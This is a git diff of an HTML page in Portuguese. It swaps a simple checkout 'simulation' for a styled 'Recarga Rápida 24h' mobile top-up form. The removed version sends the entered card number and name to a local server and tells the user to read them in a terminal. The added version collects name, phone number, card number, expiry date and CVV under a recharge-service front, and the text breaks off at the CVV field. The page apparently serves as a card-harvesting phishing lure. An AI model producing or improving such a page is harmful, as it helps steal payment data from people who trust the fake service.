@@ -1,35 +1,47 @@
 <!DOCTYPE html>
 <html lang="pt-br">
-<body style="font-family: Arial; padding: 50px; background-color: #f0f2f5;">
-    <div style="background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 350px; margin: auto; text-align: center;">
-        <h2 style="color: #1c1e21;">🛒 Checkout TCC</h2>
-        <p style="color: #606770;">Simulação de Compra</p>
-        
-        <input type="text" id="cartao" placeholder="Número do Cartão (16 dígitos)" style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px;">
-        
-        <input type="text" id="nome" placeholder="Nome Completo" style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px;">
-        
-        <button onclick="finalizar()" style="width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px;">
-            Finalizar Compra
-        </button>
-    </div>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recarga Rápida 24h</title>
+    <style>
+        body { background-color: #0d1117; color: #f0f6fc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #161b22; padding: 25px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 350px; }
+        h2 { text-align: center; color: #58a6ff; margin-bottom: 20px; }
+        label { display: block; margin: 10px 0 5px; font-size: 14px; color: #8b949e; }
+        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; }
+        .row { display: flex; gap: 10px; }
+        button { width: 100%; padding: 15px; background: #238636; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        button:hover { background: #2ea043; }
+        .info-24h { text-align: center; font-size: 12px; color: #8b949e; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Recarga Celular</h2>
+        <form id="formRecarga">
+            <label>Operadora</label>
+            <select id="operadora" required>
+                <option value="">Selecione...</option>
+                <option value="Vivo">Vivo</option>
+                <option value="Tim">Tim</option>
+                <option value="Claro">Claro</option>
+            </select>
 
-    <script>
-        async function finalizar() {
-            const dados = {
-                cartao: document.getElementById('cartao').value,
-                nome: document.getElementById('nome').value
-            };
-            
-            // Manda os dados para o seu server.js
-            await fetch('/finalizar', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(dados)
-            });
-            
-            alert('Enviado com sucesso! Veja os dados no terminal do VS Code.');
-        }
-    </script>
-</body>
-</html>
+            <label>Nome Completo</label>
+            <input type="text" id="nome" placeholder="Seu nome" required>
+
+            <label>Número do Telefone</label>
+            <input type="tel" id="telefone" placeholder="(00) 00000-0000" required>
+
+            <label>Número do Cartão</label>
+            <input type="text" id="cartao" placeholder="0000 0000 0000 0000" maxlength="16" required>
+
+            <div class="row">
+                <div>
+                    <label>Validade</label>
+                    <input type="text" id="data" placeholder="MM/AA" maxlength="5" required>
+                </div>
+                <div>
+                    <label>CVV</label>
+                    <input type="text" id="cvv" placeholder="000" maxlength
